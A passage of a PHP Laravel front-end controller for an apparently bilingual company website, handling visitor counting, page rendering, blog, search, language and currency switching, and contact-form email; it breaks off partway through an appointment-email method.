<?php

namespace App\Http\Controllers\Front;

use App;
use App\Classes\GeniusMailer;
use App\Classes\Markury\src\Adapter\MarkuryPost;
use App\Http\Controllers\Controller;
use App\Models\ads;
use App\Models\Appointment;
use App\Models\Banner;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Brand;
use App\Models\Cart;
use App\Models\Category;
use App\Models\Childcategory;
use App\Models\City;
use App\Models\Color;
use App\Models\Contact;
use App\Models\Counter;
use App\Models\Country;
use App\Models\Currency;
use App\Models\Generalsetting;
use App\Models\Language;
use App\Models\Notifications;
use App\Models\Offer;
use App\Models\OfferProduct;
use App\Models\Order;
use App\Models\Package;
use App\Models\Product;
use App\Models\Subcategory;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Zone;
use App\Traits\GetLang;
use App\Userdetails;
use Auth;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;

class FrontendController extends Controller
{

    use GetLang;
    public function __construct()
    {
        $this->auth_guests();
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }
    }

    function getOS()
    {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }


    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    public function index(Request $request, $lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        $sliders = DB::table('sliders')->where('mobile_setting', 0)->get();
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();


        $ps = DB::table('pagesettings')->find(1);


        $fix_banners = DB::table('banners')->where('type', '=', 'Fix')->get();

        $blogs = Blog::orderBy('created_at', 'desc')->get()->take(9);
        $services = DB::table('our_teams')->get();

        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $our_teams = DB::table('shipment')->get();
        $partners = DB::table('partners')->get();
        $images = DB::table('ads')->orderby('id', 'desc')->get();
        $categoriess =  Category::where('status', 1)->get()->take(6);
        $subcategories =  Subcategory::where('status', 1)->get();
        $categoriesss =  Category::where('status', 1)->get()->skip(6);
        $works =  Zone::where('status', 1)->get();
        $types =  City::where('status', 1)->get();
        $locations =  Country::where('status', 1)->get();

        return view('front.index', compact('ps', 'sliders', 'locations', 'types', 'blogs', 'works', 'images', 'our_teams', 'counters', 'categoriess', 'subcategories', 'about_uss', 'categoriesss', 'services', 'reviews', 'partners', 'fix_banners'));
    }



    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    public function about(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        $our_teams = DB::table('our_teams')->get();
        $sponsers = ads::all();
        $historis = Country::where('status', 1)->get();
        $about = '';
        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $images =  DB::table('ads')->get();

        return view('front.about', compact('about', 'about_uss', 'our_teams', 'sponsers', 'historis', 'reviews', 'counters', 'images'));
    }

    public function aboutus(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        $our_teams = DB::table('our_teams')->get();
        $sponsers = ads::all();
        $historis = Country::where('status', 1)->get();
        $about = '';
        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $images =  DB::table('ads')->get();
        return view('front.aboutus', compact('about', 'about_uss', 'our_teams', 'sponsers', 'historis', 'reviews', 'counters', 'images'));
    }
    public function jobs(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        $our_teams = DB::table('our_teams')->get();
        $jobs = DB::table('shipment')->get();
        $sponsers = ads::all();
        $historis = Country::where('status', 1)->get();
        $about = '';
        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $images =  DB::table('ads')->get();
        return view('front.jobs', compact('about', 'about_uss', 'our_teams', 'sponsers', 'historis', 'reviews', 'counters', 'images', 'jobs'));
    }

    public function latestwork(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        $our_teams = DB::table('our_teams')->get();
        $jobs = DB::table('shipment')->get();
        $sponsers = ads::all();
        $historis = Country::where('status', 1)->get();
        $about = '';
        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $images =  DB::table('ads')->orderby('id', 'desc')->get();

        return view('front.latestwork', compact('about', 'about_uss', 'our_teams', 'sponsers', 'historis', 'reviews', 'counters', 'images', 'jobs'));
    }
    public function profits(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        $our_teams = DB::table('our_teams')->get();
        $jobs = DB::table('shipment')->get();
        $sponsers = ads::all();
        $historis = Country::where('status', 1)->get();
        $about = '';
        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $images =  DB::table('ads')->get();
        return view('front.profits', compact('about', 'about_uss', 'our_teams', 'sponsers', 'historis', 'reviews', 'counters', 'images', 'jobs'));
    }

    public function management(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        $our_teams = DB::table('our_teams')->get();
        $jobs = DB::table('shipment')->get();
        $sponsers = ads::all();
        $historis = Country::where('status', 1)->get();
        $about = '';
        $reviews =  DB::table('reviews')->get();
        $counters =  DB::table('packages')->get();
        $images =  DB::table('ads')->get();
        return view('front.management', compact('about', 'about_uss', 'our_teams', 'sponsers', 'historis', 'reviews', 'counters', 'images', 'jobs'));
    }
    public function what_we_do(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $events =  Product::where('status', '=', 1)->orderBy('id', 'desc')->paginate(12);
        $about = '';

        return view('front.what-we-do', compact('about', 'events'));
    }


    public function gallery(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        //   $galleries= DB::table('banners')->paginate(9);
        $about = '';
        $galleries = Country::where('status', 1)->get();
        $services = DB::table('our_teams')->get();
        $cats = Zone::where('status', 1)->get();
        $images = Banner::get();
        return view('front.gallery', compact('galleries', 'cats', 'images', 'services'));
    }

    public function products(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        //   $galleries= DB::table('banners')->paginate(9);
        $about = '';
        $galleries = Country::where('status', 1)->get();
        $services = DB::table('our_teams')->get();
        $cats = Zone::where('status', 1)->get();
        $images =  DB::table('ads')->get();
        $about_uss = DB::table('brands')->where('is_featured', 1)->where('status', 1)->get();
        return view('front.products', compact('galleries', 'cats', 'images', 'services', 'about_uss'));
    }

    public function search(Request $request)
    {
        $location = $request->location;
        $ptypes = $request->ptypes;
        $price = $request->price;
        $prods = Product::when($location, function ($query, $location) {
            return $query->where('location_id', '=', $location);
        })
            ->when($ptypes, function ($query, $ptypes) {
                return $query->where('type_id', '=', $ptypes);
            })
            ->when($price, function ($query, $price) {
                return $query->where('range_id', '=', $price);
            });
        $products = $prods->where('status', 1)->get();
        return view('front.products', ['products' => $products, 'sign' => $this->lang()]);
    }
    public function product($lang, $slug)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $product = Brand::where('slug', $slug)->orwhere('slug_ar', $slug)->where('status', 1)->firstOrFail();




        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }


        $vendors = Product::where('status', '=', 1)->where('user_id', '=', 0)->inRandomOrder()->take(8)->get();

        return view('front.products-de', compact('product', 'curr', 'vendors'));
    }
    public function video(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        //   $galleries= DB::table('banners')->paginate(9);
        $about = '';
        $videos = DB::table('partners')->get();

        return view('front.vedios', compact('videos'));
    }


    public function product_video(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        //   $galleries= DB::table('banners')->paginate(9);
        $about = '';
        $videos = DB::table('partners')->where('type', 'product')->get();

        $type = 'product';
        return view('front.videos', compact('videos', 'type'));
    }

    public function project_video(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        //   $galleries= DB::table('banners')->paginate(9);
        $about = '';
        $videos = DB::table('partners')->where('type', 'project')->get();
        $type = 'project';
        return view('front.videos', compact('videos', 'type'));
    }


    public function solution($lang, $slug)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $solution = Product::where('slug', $slug)->orwhere('slug_ar', $slug)->where('status', 1)->firstOrFail();

        $solution->views += 1;
        $solution->update();


        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }


        $vendors = Product::where('status', '=', 1)->where('user_id', '=', 0)->inRandomOrder()->take(8)->get();

        return view('front.solution', compact('solution', 'curr', 'vendors'));
    }
    public function appointment($lang)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();



        return view('front.appointment');
    }

    public function markets_details($lang, $slug)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $market = Product::where('slug', $slug)->orwhere('slug_ar', $slug)->where('status', 1)->firstOrFail();

        $market->views += 1;
        $market->update();


        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }


        $vendors = Product::where('status', '=', 1)->where('user_id', '=', 0)->inRandomOrder()->take(8)->get();

        return view('front.markets-details', compact('market', 'curr', 'vendors'));
    }

    public function markets($lang)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $markets = Product::where('status', 1)->get();




        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }


        $vendors = Product::where('status', '=', 1)->where('user_id', '=', 0)->inRandomOrder()->take(8)->get();

        return view('front.markets', compact('markets', 'curr', 'vendors'));
    }

    public function support($lang)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $markets = Product::where('status', 1)->get();




        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }


        $vendors = Product::where('status', '=', 1)->where('user_id', '=', 0)->inRandomOrder()->take(8)->get();

        return view('front.support', compact('markets', 'curr', 'vendors'));
    }
    public function afterbefore(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $images =  DB::table('ads')->get();

        return view('front.after-bef', compact('images'));
    }

    public function service(Request $request, $lang, $slug)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();

        $service = DB::table('our_teams')->where('title', '=', $slug)->first();



        return view('front.service-details', compact('service'));
    }
    public function services(Request $request, $lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $services = DB::table('our_teams')->get();



        return view('front.services', compact('services'));
    }
    // LANGUAGE SECTION


    public function language($id)
    {

        $slang = Session::get('language');


        if (!$slang) {
            $lang  = DB::table('languages')->where('is_default', '=', 1)->first();
        } else {
            $lang  = DB::table('languages')->where('id', '=', $slang)->first();
        }

        $u =  url()->previous();


        $this->code_image();
        Session::put('language', $id);
        $sign = DB::table('languages')->where('id', '=', $id)->first();

        $x =  str_replace('/' . $lang->sign, '/' . $sign->sign, $u);




        // echo $x;

        //     return redirect($x);
        return redirect()->route('front.index', $sign->sign);


        //   if($id == 1) {

        //           $x =  str_replace("ar", "en", $u);
        //           return redirect($x);
        // //   //  return redirect()->route('front.index');
        //      }else {
        //           $x =  str_replace("en", "ar", $u);
        //       
        // //       //  return redirect()->route('front.arindex');
        //      }

        //    return redirect()->back();
    }

    // LANGUAGE SECTION ENDS


    // CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }


    // CURRENCY SECTION ENDS



    public function autosearch($slug, $lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        if (strlen($slug) > 1) {
            $search = ' ' . $slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->orWhere('name_ar', 'like', $slug . '%')->where('status', '=', 1)->take(10)->get();
            return view('load.suggest', compact('prods', 'slug'));
        }
        return "";
    }

    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }



    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request, $lang)
    {
        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $bcats = BlogCategory::all();
        $this->code_image();
        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
        $rec_blogs = Blog::orderBy('created_at', 'desc')->get()->take(5);
        $images = DB::table('ads')->get();
        return view('front.blog', compact('blogs', 'bcats', 'archives', 'rec_blogs', 'images'));
    }



    public function blogcategory(Request $request, $lang, $slug)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $rec_blogs = Blog::orderBy('created_at', 'desc')->get()->take(5);
        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->get();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
        $images = DB::table('ads')->get();

        return view('front.blog', compact('bcat', 'blogs', 'bcats', 'archives', 'rec_blogs', 'images'));
    }
    public function blogtags(Request $request, $lang, $slug)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $this->code_image();
        $rec_blogs = Blog::orderBy('created_at', 'desc')->get()->take(5);
        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->get();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
        $images = DB::table('ads')->get();
        return view('front.blog', compact('blogs', 'slug', 'bcats', 'archives', 'rec_blogs', 'images'));
    }

    public function blogsearch(Request $request, $lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $rec_blogs = Blog::orderBy('created_at', 'desc')->get()->take(5);
        $search = $request->search;
        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::get();
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('title_ar', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->orWhere('details_ar', 'like', '%' . $search . '%')->paginate(9);
        $images = DB::table('ads')->get();
        return view('front.blog', compact('blogs', 'search', 'archives', 'rec_blogs', 'images'));
    }

    public function blogarchive(Request $request, $lang, $slug)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $this->code_image();
        $rec_blogs = Blog::orderBy('created_at', 'desc')->get()->take(5);
        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        $images = DB::table('ads')->get();
        return view('front.blog', compact('blogs', 'date', 'archives', 'rec_blogs', 'images'));
    }

    public function blogshow($lang, $id)
    {

        // echo $id;
        // echo '<br>';
        // echo $lang;

        $id1 = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id1) {
            Session::put('language', $id1->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }



        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $events = Product::where('status', 1)->orderBy('id', 'desc')->get()->take(3);
        $blogs = Blog::orderBy('created_at', 'desc')->get()->take(9);
        $blog = Blog::where('slug', '=', $id)->firstOrFail();
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::where('tags', '!=', null)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        $rec_blogs = Blog::orderBy('created_at', 'desc')->get()->take(5);
        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'rec_blogs', 'blogs', 'blog_meta_tag', 'blog_meta_description', 'events'));
    }



    // -------------------------------- BLOG SECTION ENDS----------------------------------------



    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }


        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_faq == 0) {
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id', 'desc')->get();
        return view('front.faq', compact('faqs'));
    }

    public function whyus($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }


        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_faq == 0) {
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id', 'desc')->get();
        return view('front.whyUs', compact('faqs'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------

    public function team($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }


        $this->code_image();


        $our_teams = DB::table('shipment')->get();

        return view('front.team', compact('our_teams'));
    }
    public function offerss($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }


        $this->code_image();


        $offers = DB::table('shipment')->get();

        return view('front.offers', compact('offers'));
    }
    // -------------------------------- PAGE SECTION ----------------------------------------
    public function page($lang, $slug)
    {


        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }

        $this->code_image();
        $page =  DB::table('pages')->where('slug', $slug)->orwhere('slug_ar', $slug)->first();
        if (empty($page)) {
            return view('errors.404');
        }

        return view('front.page', compact('page'));
    }
    // -------------------------------- PAGE SECTION ENDS----------------------------------------


    // -------------------------------- CONTACT SECTION ----------------------------------------
    public function contact($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_contact == 0) {
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id', '=', 1)->first();
        return view('front.contact', compact('ps'));
    }


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        $ps = DB::table('pagesettings')->find(1);

        if ($gs->is_capcha == 1) {

            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value) {
                return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
            }
        }






        // Login Section
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = "Email From Of " . $request->name;

        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $dates = $request->date;
        $times = $request->time;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $request->phone . "\ndate: " . $request->date . "\ntime: " . $request->time . "\nMessage: " . $request->message;

        if (!empty($gs->contact_emails)) {


            $to =    explode(',', $gs->contact_emails);




            foreach ($to as $key => $data1) {


                if ($gs->is_smtp == 1) {
                    $data = [
                        'to' => $to[$key],
                        'subject' => $subject,
                        'body' => $msg,
                    ];

                    $mailer = new GeniusMailer();
                    $mailer->sendCustomMail($data);
                } else {
                    $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                    mail($to[$key], $subject, $msg, $headers);
                }
                // Login Section Ends


            }
        } else {

            $to = $ps->contact_email;

            if ($gs->is_smtp == 1) {
                $data = [
                    'to' => $to,
                    'subject' => $subject,
                    'body' => $msg,
                ];

                $mailer = new GeniusMailer();
                $mailer->sendCustomMail($data);
            } else {
                $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                mail($to, $subject, $msg, $headers);
            }
            // Login Section Ends


        }




        Contact::create([
            'name' => $request->name,
            'phone' => $request->phone,
            'email' => $request->email,
            'dates' => $request->date,
            'times' => $request->time,
            'message' => $request->message,
        ]);
        // Redirect Section
        return response()->json($ps->contact_success);
    }


    public function appointmentemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        $ps = DB::table('pagesettings')->find(1);

        if ($gs->is_capcha == 1) {

            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value) {
                return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
            }
        }






        // Login Section
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = "Appointment Email From " . $request->name;

        $name = $request->name;
        $phone = $request->phone;
